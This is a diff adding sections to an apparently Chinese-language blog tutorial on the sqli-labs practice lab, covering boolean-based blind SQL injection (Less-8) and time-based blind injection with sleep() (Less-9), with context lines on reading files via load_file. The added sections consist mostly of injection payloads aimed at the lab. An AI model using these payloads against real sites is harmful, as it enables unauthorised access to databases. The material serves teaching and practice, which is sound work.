@@ -46,6 +46,14 @@
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">show variables like &#39;%secure%&#39;</span><br><span class="line">当secure_file_priv没写，就可以读取磁盘的目录。</span><br><span class="line">当secure_file_priv为G:\，就可以读取G盘的文件。</span><br><span class="line">当secure_file_priv为NULL，load_file就不能加载文件。</span><br></pre></td></tr></table></figure>
 
 <p><img src="/2020/09/07/sqli-labs%E6%95%99%E7%A8%8B-3/3-4.jpg" alt="3-4"></p>
+<h1 id="less8"><a href="#less8" class="headerlink" title="less8"></a>less8</h1><p>单引号报错，配合and 1=1 1=2 猜测出sql语句仅仅被单引号包裹，试试布尔盲注：</p>
+<p>构造语句：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id =1&#x27; and length(database()) = 8 <span class="comment">-- -    //判断长度</span></span><br><span class="line">?id =1&#x27; and left (<span class="keyword">select</span> <span class="keyword">database</span>(),<span class="number">1</span>) = <span class="string">&#x27;s&#x27;</span>  //第一位的字符</span><br></pre></td></tr></table></figure>
+
+<h1 id="less9"><a href="#less9" class="headerlink" title="less9"></a>less9</h1><p>时间忙注，无论什么页面都没有变化。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">id &#x3D; 1&#39; and sleep(5) -- - </span><br><span class="line">?id&#x3D;1&#39; and if(length(database())&#x3D;8 , sleep(3), 1) --+. &#x2F;&#x2F;有长度为8</span><br><span class="line">?id&#x3D;1&#39; and if (left (select database(),1) &#x3D; &#39;s&#39; , sleep(5) ,1) -- - &#x2F;&#x2F;第一位为s则睡眠5秒</span><br></pre></td></tr></table></figure>
+
+
 
     </div>
 
